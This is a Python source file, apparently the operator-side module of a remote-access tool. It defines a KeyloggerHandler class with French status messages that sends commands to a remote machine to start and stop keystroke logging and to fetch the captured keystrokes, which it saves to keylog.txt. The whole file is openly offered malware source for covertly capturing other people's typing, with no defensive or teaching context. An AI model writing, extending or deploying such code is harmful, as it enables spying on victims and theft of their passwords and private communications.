class KeyloggerHandler:
    def __init__(self, conn_manager):
        self.conn_manager = conn_manager
        self.logging = False
        self.log_file = "keylog.txt"

    def start_logging(self):
        if not self.conn_manager.conn:
            return "[!] Pas de connexion établie."

        try:
            self.conn_manager.conn.send(b"START_KEYLOG")
            response = self.conn_manager.conn.recv(1024).decode()
            self.logging = True
            return f"[+] {response}"
        except Exception as e:
            return f"[!] Erreur: {str(e)}"

    def stop_logging(self):
        if not self.conn_manager.conn:
            return "[!] Pas de connexion établie."

        try:
            self.conn_manager.conn.send(b"STOP_KEYLOG")
            response = self.conn_manager.conn.recv(1024).decode()
            self.logging = False
            return f"[+] {response}"
        except Exception as e:
            return f"[!] Erreur: {str(e)}"

    def get_logs(self):
        if not self.conn_manager.conn:
            return "[!] Pas de connexion établie.", ""

        try:
            self.conn_manager.conn.send(b"GET_KEYLOGS")
            logs = self.conn_manager.conn.recv(4096).decode()
            with open(self.log_file, "w") as f:
                f.write(logs)
            return "[+] Logs reçus", logs
        except Exception as e:
            return f"[!] Erreur: {str(e)}", ""